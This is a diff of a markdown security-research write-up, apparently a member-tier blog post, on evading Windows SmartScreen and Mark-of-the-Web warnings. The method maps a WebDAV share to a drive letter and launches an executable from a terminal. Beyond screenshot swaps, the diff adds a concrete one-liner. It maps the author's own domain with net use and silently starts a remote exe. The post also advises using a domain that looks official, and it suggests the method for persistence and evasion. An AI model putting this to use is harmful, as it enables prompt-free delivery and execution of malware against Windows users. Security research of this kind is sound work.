@@ -27,7 +27,7 @@ Now, this is where things get really interesting from a **SmartScreen** and **MO
 
 But first!  A small caveat...So here's the thing.  As with most of my research, I inevitably hit a roadblock somwhere in my initial testing.  Oh, did I hit a massive roadblock.  Even with this advantage I briefly covered above about using UNC paths to elude SmartScreen and MoTW, a direct UNC-based launch still triggers a warning.  Not a "**Hey you!  You downloaded this from the Internet**!" warning. No, more like this kind:
 
-<img width="668" height="496" alt="image" src="https://github.com/user-attachments/assets/461d20e9-4412-4ad9-9927-daa7600c87cc" />
+<img width="532" height="399" alt="image" src="https://github.com/user-attachments/assets/ae3c2868-20db-4ffd-ab8b-a310808d6158" />
 
 Why UNC Paths Still Prompt (Even With Signed Binaries)
 -
@@ -46,15 +46,17 @@ The two ways that flag the **This file is in a location outside your local netwo
 
 If I use the **windows-> run command**:
 
-<img width="454" height="266" alt="image" src="https://github.com/user-attachments/assets/ded67ebe-0391-4314-8e43-ced3cf895485" />
+<img width="457" height="271" alt="image" src="https://github.com/user-attachments/assets/a021112a-548b-4fd5-ba92-e972909623a8" />
 
-<img width="668" height="496" alt="image" src="https://github.com/user-attachments/assets/6b114005-2ca3-4b2a-a2f6-5dfd88a6ccb0" />
+<img width="532" height="399" alt="image" src="https://github.com/user-attachments/assets/010387a1-4809-4fbb-a7ec-6068043e4f68" />
 
 OR, If I use **Windows Explorer**:
 
-<img width="1318" height="365" alt="image" src="https://github.com/user-attachments/assets/343d2136-1017-48a2-8a40-f3db4cd1b14b" />
+<img width="1349" height="314" alt="image" src="https://github.com/user-attachments/assets/5cb20d6e-5550-4caf-a60c-b2a3fa51540e" />
 
-<img width="668" height="496" alt="image" src="https://github.com/user-attachments/assets/6b114005-2ca3-4b2a-a2f6-5dfd88a6ccb0" />
+**Same thing...**
+
+<img width="532" height="399" alt="image" src="https://github.com/user-attachments/assets/010387a1-4809-4fbb-a7ec-6068043e4f68" />
 
 **HOWEVER!!! I had a breakthrough** 🥷
 
@@ -64,9 +66,7 @@ The Complete Breakthrough: Mapped Drives and execution from within a Terminal En
 
 If we execute our WebDav share from within a Powershell or CMD terminal....EUREKA!  No more ALERTS!!!!!  See for yourself.  Here's me pointing to my webdav share within a Powershell terminal session:
 
-<img width="1055" height="384" alt="image" src="https://github.com/user-attachments/assets/500556eb-8fd0-472d-a0f9-39315022ffab" />
-
-<img width="403" height="669" alt="image" src="https://github.com/user-attachments/assets/e4f140b6-6c84-4521-94f6-996cf2397369" />
+<img width="1489" height="825" alt="image" src="https://github.com/user-attachments/assets/24c0af78-9172-4216-80de-c4313fc907a2" />
 
 The exe I'm executing from my WebDav share executes calc btw 😆
 
@@ -105,6 +105,12 @@ Discovery Part 2!
 Instead of launching files directly from the UNC path, map the WebDAV share to a drive letter first, then launch from the mapped drive.
   
 **cmd.exe /c net use Z: https://some_server_you_own/shared-files /persistent:yes 2>nul && start "" "Z:\YOUR_EXECUTABLE.exe"**
+
+In my case, that would be: 
+
+**cmd.exe /c net use Z: https://transf0rm.g3tsyst3m.online/shared-files /persistent:yes 2>nul && start "" "Z:\winexec_nonulls.exe"**
+
+(don't worry, I delete my demo domains so I'm okay with you seeing them 😸)
 
 When I tested this, the executable launched with zero prompts, zero warnings, zero MOTW tagging, zero SmartScreen reputation checks.  Nothing. Silent execution.  It was bliss.
 
@@ -163,7 +169,7 @@ You could also use this for **persistence purposes** or **evasion**.  The abilit
 
 Also before I forget, you'll likely want to access your **WebDav** share from a domain versus IP address to make it look more official.  I used **Cloudflare** to setup my DNS entries:
 
-<img width="1584" height="668" alt="image" src="https://github.com/user-attachments/assets/18243dad-831d-4c02-951f-43aec55b08b9" />
+<img width="1523" height="369" alt="image" src="https://github.com/user-attachments/assets/b7a83944-73c3-4d1a-90bb-13c0431e8bd0" />
 
 
 🎁 ***Bonus Content for all Members! (Sapphire, Emerald, Diamond Tier)*** 🎁
